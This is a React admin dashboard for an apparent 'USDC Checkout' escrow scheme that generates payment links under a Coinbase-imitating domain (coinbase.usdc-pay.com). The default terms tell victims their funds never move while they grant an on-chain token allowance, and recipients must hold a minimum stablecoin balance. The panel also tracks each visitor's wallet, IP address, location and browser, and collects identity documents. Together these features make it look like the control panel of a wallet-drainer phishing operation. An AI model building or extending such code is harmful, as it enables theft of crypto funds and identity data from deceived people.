"use client";

import { useEffect, useState } from "react";
import EscrowShell from "@/components/EscrowShell";

interface Session {
  id: string;
  recipient_name: string;
  amount_eur: number;
  issued_at: string;
  started_at: string | null;
  session_minutes: number;
  status: string;
  terms: string;
  min_balance_mode: "fixed" | "percent";
  min_balance_eur: number;
  min_balance_percent: number | null;
  recipient_wallet: string | null;
}

interface SessionEvent {
  id: string;
  event_type: string;
  wallet_address: string | null;
  ip_address: string | null;
  country: string | null;
  region: string | null;
  city: string | null;
  user_agent: string | null;
  created_at: string;
}

interface IdentityRecord {
  id: string;
  wallet_address: string;
  full_name: string;
  country: string;
  document_path: string;
  documentUrl: string | null;
  created_at: string;
}

const SESSION_KEY = "escrow_admin_secret";

const DEFAULT_TERMS = [
  "Your funds always remain in your own wallet. Connecting your wallet never moves or takes custody of any funds.",
  "You are only granting an on-chain permission (allowance) so the deposit can be finalized once every requirement below is met.",
  "This session is valid for a limited time. If it expires before all requirements are met, it closes automatically and the reserved amount is returned to the sender.",
].join("\n");

function formatEUR(n: number) {
  return n.toLocaleString("en-IE", { style: "currency", currency: "EUR", maximumFractionDigits: 2 });
}

function statusPill(status: string) {
  const map: Record<string, string> = {
    pending: "bg-surface-strong text-body",
    active: "bg-brand/10 text-brand",
    completed: "bg-up/10 text-up",
    expired: "bg-down/10 text-down",
    cancelled: "bg-surface-strong text-muted",
  };
  return "inline-flex rounded-pill px-2.5 py-1 text-[11px] font-semibold " + (map[status] ?? "bg-surface-strong text-muted");
}

function short(addr: string) {
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

function summarizeUA(ua: string | null) {
  if (!ua) return "Unknown";
  const browser = /Edg\//.test(ua) ? "Edge" : /OPR\//.test(ua) ? "Opera" : /Chrome\//.test(ua) ? "Chrome" : /Firefox\//.test(ua) ? "Firefox" : /Safari\//.test(ua) && !/Chrome/.test(ua) ? "Safari" : "Unknown";
  const os = /iPhone|iPad/.test(ua) ? "iOS" : /Android/.test(ua) ? "Android" : /Mac OS X/.test(ua) ? "macOS" : /Windows/.test(ua) ? "Windows" : /Linux/.test(ua) ? "Linux" : "Unknown OS";
  return `${browser} · ${os}`;
}

const EVENT_LABELS: Record<string, string> = {
  view: "Viewed page",
  connect: "Connected wallet",
  id_submitted: "Submitted ID",
  balance_check: "Checked balance",
  approved: "Approved deposit",
  expired: "Session expired",
};

function ActivityPanel({ sessionId, secret }: { sessionId: string; secret: string }) {
  const [events, setEvents] = useState<SessionEvent[] | null>(null);
  const [records, setRecords] = useState<IdentityRecord[] | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    let cancelled = false;
    async function load() {
      setLoading(true);
      try {
        const [eventsRes, identityRes] = await Promise.all([
          fetch(`/api/escrow/admin/sessions/${sessionId}/events`, { headers: { Authorization: `Bearer ${secret}` } }),
          fetch(`/api/escrow/admin/sessions/${sessionId}/identity`, { headers: { Authorization: `Bearer ${secret}` } }),
        ]);
        const eventsJson = await eventsRes.json();
        const identityJson = await identityRes.json();
        if (cancelled) return;
        setEvents(eventsJson.ok ? eventsJson.events : []);
        setRecords(identityJson.ok ? identityJson.records : []);
      } catch (err) {
        console.error(err);
        if (!cancelled) {
          setEvents([]);
          setRecords([]);
        }
      } finally {
        if (!cancelled) setLoading(false);
      }
    }
    void load();
    return () => {
      cancelled = true;
    };
  }, [sessionId, secret]);

  const connectedAddresses = Array.from(
    new Map(
      (events ?? [])
        .filter((e) => e.wallet_address)
        .map((e) => [e.wallet_address, e])
    ).values()
  );

  if (loading) {
    return <div className="px-6 py-6 text-[13px] text-muted">Loading activity...</div>;
  }

  return (
    <div className="space-y-6 border-t border-hairline bg-surface-soft px-6 py-6">
      <div>
        <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">
          Connected addresses ({connectedAddresses.length})
        </p>
        {connectedAddresses.length === 0 ? (
          <p className="text-[13px] text-muted">No wallet has connected yet.</p>
        ) : (
          <div className="space-y-1.5">
            {connectedAddresses.map((e) => (
              <div key={e.wallet_address} className="flex items-center justify-between rounded-md border border-hairline bg-bg px-3 py-2 text-[13px]">
                <span className="font-mono font-medium text-ink">{e.wallet_address}</span>
                <span className="text-[12px] text-muted">
                  {[e.city, e.region, e.country].filter(Boolean).join(", ") || "Unknown location"}
                </span>
              </div>
            ))}
          </div>
        )}
      </div>

      <div>
        <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">
          ID records ({(records ?? []).length})
        </p>
        {(records ?? []).length === 0 ? (
          <p className="text-[13px] text-muted">No identity verification submitted yet.</p>
        ) : (
          <div className="space-y-2">
            {records!.map((r) => (
              <div key={r.id} className="rounded-md border border-hairline bg-bg px-3.5 py-3 text-[13px]">
                <div className="flex items-center justify-between">
                  <span className="font-semibold text-ink">{r.full_name}</span>
                  <span className="text-[12px] text-muted">{new Date(r.created_at).toLocaleString()}</span>
                </div>
                <div className="mt-1 flex items-center gap-3 text-[12px] text-body">
                  <span>{r.country}</span>
                  <span className="font-mono">{short(r.wallet_address)}</span>
                  {r.documentUrl ? (
                    <a href={r.documentUrl} target="_blank" rel="noreferrer" className="font-semibold text-brand hover:underline">
                      View document
                    </a>
                  ) : (
                    <span className="text-muted">Document unavailable</span>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      <div>
        <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">
          Activity log ({(events ?? []).length})
        </p>
        {(events ?? []).length === 0 ? (
          <p className="text-[13px] text-muted">No activity recorded yet.</p>
        ) : (
          <div className="overflow-x-auto rounded-md border border-hairline bg-bg">
            <table className="w-full text-left text-[12px]">
              <thead>
                <tr className="border-b border-hairline text-muted">
                  <th className="px-3 py-2 font-medium">Event</th>
                  <th className="px-3 py-2 font-medium">Wallet</th>
                  <th className="px-3 py-2 font-medium">Location</th>
                  <th className="px-3 py-2 font-medium">IP</th>
                  <th className="px-3 py-2 font-medium">Browser</th>
                  <th className="px-3 py-2 font-medium">Time</th>
                </tr>
              </thead>
              <tbody>
                {events!.map((e) => (
                  <tr key={e.id} className="border-b border-hairline last:border-0">
                    <td className="px-3 py-2 font-medium text-ink">{EVENT_LABELS[e.event_type] ?? e.event_type}</td>
                    <td className="px-3 py-2 font-mono text-body">{e.wallet_address ? short(e.wallet_address) : "—"}</td>
                    <td className="px-3 py-2 text-body">{[e.city, e.region, e.country].filter(Boolean).join(", ") || "Unknown"}</td>
                    <td className="px-3 py-2 font-mono text-body">{e.ip_address ?? "—"}</td>
                    <td className="px-3 py-2 text-body">{summarizeUA(e.user_agent)}</td>
                    <td className="px-3 py-2 text-muted">{new Date(e.created_at).toLocaleString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}

export default function AdminPage() {
  const [secret, setSecret] = useState<string>("");
  const [authed, setAuthed] = useState(false);
  const [authError, setAuthError] = useState<string | null>(null);
  const [sessions, setSessions] = useState<Session[]>([]);
  const [loading, setLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [formError, setFormError] = useState<string | null>(null);
  const [expanded, setExpanded] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [justCreatedLink, setJustCreatedLink] = useState<string | null>(null);

  const [recipientName, setRecipientName] = useState("");
  const [amountEur, setAmountEur] = useState("");
  const [sessionMinutes, setSessionMinutes] = useState("25");
  const [minBalanceMode, setMinBalanceMode] = useState<"fixed" | "percent">("percent");
  const [minBalanceEur, setMinBalanceEur] = useState("100");
  const [minBalancePercent, setMinBalancePercent] = useState("5");
  const [terms, setTerms] = useState(DEFAULT_TERMS);

  useEffect(() => {
    const stored = typeof window !== "undefined" ? sessionStorage.getItem(SESSION_KEY) : null;
    if (stored) {
      setSecret(stored);
      void loadSessions(stored);
    }
  }, []);

  async function loadSessions(withSecret: string) {
    setLoading(true);
    try {
      const res = await fetch("/api/escrow/admin/sessions", {
        headers: { Authorization: `Bearer ${withSecret}` },
      });
      if (res.status === 401) {
        setAuthed(false);
        setAuthError("Incorrect admin key.");
        sessionStorage.removeItem(SESSION_KEY);
        return;
      }
      const json = await res.json();
      if (json.ok) {
        setAuthed(true);
        setAuthError(null);
        setSessions(json.sessions ?? []);
        sessionStorage.setItem(SESSION_KEY, withSecret);
      }
    } catch (err) {
      console.error(err);
      setAuthError("Couldn't reach the server. Try again.");
    } finally {
      setLoading(false);
    }
  }

  async function handleUnlock(e: React.FormEvent) {
    e.preventDefault();
    setAuthError(null);
    await loadSessions(secret);
  }

  const parsedAmount = parseFloat(amountEur) || 0;
  const previewMinBalance =
    minBalanceMode === "percent"
      ? (parsedAmount * (parseFloat(minBalancePercent) || 0)) / 100
      : parseFloat(minBalanceEur) || 0;

  async function handleCreate(e: React.FormEvent) {
    e.preventDefault();
    setFormError(null);

    const amount = parseFloat(amountEur);
    if (!recipientName.trim()) return setFormError("Enter a recipient name.");
    if (!Number.isFinite(amount) || amount <= 0) return setFormError("Enter a valid amount.");
    if (minBalanceMode === "percent") {
      const pct = parseFloat(minBalancePercent);
      if (!Number.isFinite(pct) || pct <= 0 || pct > 100) return setFormError("Enter a valid percentage (1-100).");
    }

    setSubmitting(true);
    try {
      const res = await fetch("/api/escrow/admin/sessions", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${secret}` },
        body: JSON.stringify({
          recipientName: recipientName.trim(),
          amountEur: amount,
          sessionMinutes: parseInt(sessionMinutes, 10) || 25,
          minBalanceMode,
          minBalanceEur: parseFloat(minBalanceEur) || 100,
          minBalancePercent: parseFloat(minBalancePercent) || 5,
          terms,
        }),
      });
      const json = await res.json();
      if (!json.ok) {
        setFormError("Couldn't create the session.");
        return;
      }
      setRecipientName("");
      setAmountEur("");
      const entryDomain =
        process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
      setJustCreatedLink(`${entryDomain}/pay/${json.session.id}`);
      await loadSessions(secret);
    } catch (err) {
      console.error(err);
      setFormError("Couldn't reach the server.");
    } finally {
      setSubmitting(false);
    }
  }

  async function copyLink(id: string) {
    const entryDomain =
      process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
    const link = `${entryDomain}/pay/${id}`;
    try {
      await navigator.clipboard.writeText(link);
      setCopiedId(id);
      setTimeout(() => setCopiedId((prev) => (prev === id ? null : prev)), 2000);
    } catch (err) {
      console.error("[admin] copy link failed:", err);
    }
  }

  async function handleCancel(id: string) {
    await fetch(`/api/escrow/admin/sessions/${id}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${secret}` },
      body: JSON.stringify({ status: "cancelled" }),
    });
    await loadSessions(secret);
  }

  if (!authed) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg px-5">
        <form onSubmit={handleUnlock} className="w-full max-w-sm rounded-xl border border-hairline bg-surface-card p-7 shadow-card">
          <h1 className="mb-1 text-[20px] font-semibold text-ink">USDC Checkout admin</h1>
          <p className="mb-6 text-[13px] text-body">Enter the admin key to manage checkout sessions.</p>
          <input
            type="password"
            value={secret}
            onChange={(e) => setSecret(e.target.value)}
            placeholder="Admin key"
            className="mb-3 h-12 w-full rounded-md border border-hairline bg-bg px-4 text-[15px] text-ink focus:border-2 focus:border-brand focus:outline-none"
          />
          {authError && <p className="mb-3 text-[13px] text-down">{authError}</p>}
          <button
            type="submit"
            disabled={loading}
            className="h-12 w-full rounded-pill bg-brand text-[14px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
          >
            {loading ? "Checking..." : "Unlock"}
          </button>
        </form>
      </div>
    );
  }

  return (
    <EscrowShell>
      <div className="mx-auto max-w-[1000px] px-5 py-10 sm:px-8">
        <div className="mb-8 flex items-center justify-between">
          <h1 className="text-[24px] font-semibold text-ink">USDC Checkout sessions</h1>
          <button
            onClick={() => {
              sessionStorage.removeItem(SESSION_KEY);
              setAuthed(false);
              setSecret("");
            }}
            className="text-[13px] font-medium text-muted hover:text-ink"
          >
            Lock
          </button>
        </div>

        {justCreatedLink && (
          <div className="mb-6 flex flex-wrap items-center justify-between gap-3 rounded-xl border border-brand/20 bg-brand/5 px-5 py-4">
            <div>
              <p className="mb-1 text-[12px] font-semibold uppercase tracking-[0.06em] text-brand">Session created</p>
              <p className="break-all font-mono text-[13px] text-ink">{justCreatedLink}</p>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={async () => {
                  await navigator.clipboard.writeText(justCreatedLink);
                  setCopiedId("just-created");
                  setTimeout(() => setCopiedId((prev) => (prev === "just-created" ? null : prev)), 2000);
                }}
                className="h-9 rounded-pill bg-brand px-4 text-[13px] font-semibold text-on-brand transition hover:bg-brand-active"
              >
                {copiedId === "just-created" ? "Copied!" : "Copy link"}
              </button>
              <button onClick={() => setJustCreatedLink(null)} className="text-[13px] text-muted hover:text-ink">
                Dismiss
              </button>
            </div>
          </div>
        )}

        <form onSubmit={handleCreate} className="mb-10 rounded-xl border border-hairline bg-surface-card p-6 shadow-card">
          <h2 className="mb-5 text-[16px] font-semibold text-ink">New session</h2>
          <div className="mb-4 grid gap-4 sm:grid-cols-2">
            <div>
              <label className="mb-1.5 block text-[13px] font-semibold text-ink">Recipient name</label>
              <input
                value={recipientName}
                onChange={(e) => setRecipientName(e.target.value)}
                className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                placeholder="Jane Doe"
              />
            </div>
            <div>
              <label className="mb-1.5 block text-[13px] font-semibold text-ink">Amount (EUR)</label>
              <input
                value={amountEur}
                onChange={(e) => setAmountEur(e.target.value.replace(/[^0-9.]/g, ""))}
                className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                placeholder="2000"
                inputMode="decimal"
              />
            </div>
            <div>
              <label className="mb-1.5 block text-[13px] font-semibold text-ink">Session length (minutes)</label>
              <input
                value={sessionMinutes}
                onChange={(e) => setSessionMinutes(e.target.value.replace(/[^0-9]/g, ""))}
                className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                inputMode="numeric"
              />
            </div>
          </div>

          <div className="mb-5 rounded-lg border border-hairline bg-surface-soft p-4">
            <label className="mb-2.5 block text-[13px] font-semibold text-ink">Minimum balance requirement</label>
            <div className="mb-3 inline-flex rounded-pill border border-hairline bg-bg p-1">
              <button
                type="button"
                onClick={() => setMinBalanceMode("percent")}
                className={
                  "rounded-pill px-3.5 py-1.5 text-[12px] font-semibold transition " +
                  (minBalanceMode === "percent" ? "bg-brand text-on-brand" : "text-body hover:text-ink")
                }
              >
                % of amount
              </button>
              <button
                type="button"
                onClick={() => setMinBalanceMode("fixed")}
                className={
                  "rounded-pill px-3.5 py-1.5 text-[12px] font-semibold transition " +
                  (minBalanceMode === "fixed" ? "bg-brand text-on-brand" : "text-body hover:text-ink")
                }
              >
                Fixed EUR amount
              </button>
            </div>

            {minBalanceMode === "percent" ? (
              <div className="flex items-center gap-2">
                <input
                  value={minBalancePercent}
                  onChange={(e) => setMinBalancePercent(e.target.value.replace(/[^0-9.]/g, ""))}
                  className="h-11 w-24 rounded-md border border-hairline bg-bg px-3 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                  inputMode="decimal"
                />
                <span className="text-[14px] text-body">% of the checkout amount</span>
              </div>
            ) : (
              <input
                value={minBalanceEur}
                onChange={(e) => setMinBalanceEur(e.target.value.replace(/[^0-9.]/g, ""))}
                className="h-11 w-40 rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                inputMode="decimal"
              />
            )}

            <p className="mt-2.5 text-[12px] text-muted">
              Recipients need at least <span className="font-semibold text-ink">{formatEUR(previewMinBalance)}</span> in
              USDT/USDC across supported chains before they can approve the deposit.
            </p>
          </div>

          <div className="mb-5">
            <label className="mb-1.5 block text-[13px] font-semibold text-ink">Terms shown to recipient</label>
            <textarea
              value={terms}
              onChange={(e) => setTerms(e.target.value)}
              rows={4}
              className="w-full rounded-md border border-hairline bg-bg px-3.5 py-3 text-[13px] leading-relaxed text-ink focus:border-2 focus:border-brand focus:outline-none"
            />
          </div>
          {formError && <p className="mb-4 text-[13px] text-down">{formError}</p>}
          <button
            type="submit"
            disabled={submitting}
            className="h-11 rounded-pill bg-brand px-6 text-[14px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
          >
            {submitting ? "Creating..." : "Create session"}
          </button>
        </form>

        <div className="rounded-xl border border-hairline bg-surface-card shadow-card">
          <div className="border-b border-hairline px-6 py-4">
            <h2 className="text-[16px] font-semibold text-ink">History</h2>
          </div>
          <div className="divide-y divide-hairline">
            {sessions.length === 0 && (
              <p className="px-6 py-8 text-center text-[13px] text-muted">No sessions yet.</p>
            )}
            {sessions.map((s) => (
              <div key={s.id}>
                <button
                  onClick={() => setExpanded((prev) => (prev === s.id ? null : s.id))}
                  className="flex w-full flex-wrap items-center justify-between gap-3 px-6 py-4 text-left transition hover:bg-surface-soft"
                >
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-[14px] font-semibold text-ink">{s.recipient_name}</span>
                      <span className={statusPill(s.status)}>{s.status}</span>
                    </div>
                    <p className="mt-0.5 text-[12px] text-muted">
                      Issued {new Date(s.issued_at).toLocaleString()} · Min balance{" "}
                      {s.min_balance_mode === "percent" ? `${s.min_balance_percent}% (${formatEUR(s.min_balance_eur)})` : formatEUR(s.min_balance_eur)}
                      {s.recipient_wallet ? ` · ${short(s.recipient_wallet)}` : ""}
                    </p>
                  </div>
                  <div className="flex items-center gap-4">
                    <span className="font-mono text-[15px] font-medium text-ink">{formatEUR(s.amount_eur)}</span>
                    {(s.status === "pending" || s.status === "active") && (
                      <span
                        onClick={(e) => {
                          e.stopPropagation();
                          void copyLink(s.id);
                        }}
                        className="text-[12px] font-semibold text-brand hover:underline"
                      >
                        {copiedId === s.id ? "Copied!" : "Copy link"}
                      </span>
                    )}
                    {(s.status === "pending" || s.status === "active") && (
                      <span
                        onClick={(e) => {
                          e.stopPropagation();
                          handleCancel(s.id);
                        }}
                        className="text-[12px] font-semibold text-down hover:underline"
                      >
                        Cancel
                      </span>
                    )}
                    <svg
                      className={"h-4 w-4 text-muted transition-transform " + (expanded === s.id ? "rotate-180" : "")}
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </button>
                {expanded === s.id && <ActivityPanel sessionId={s.id} secret={secret} />}
              </div>
            ))}
          </div>
        </div>
      </div>
    </EscrowShell>
  );
}
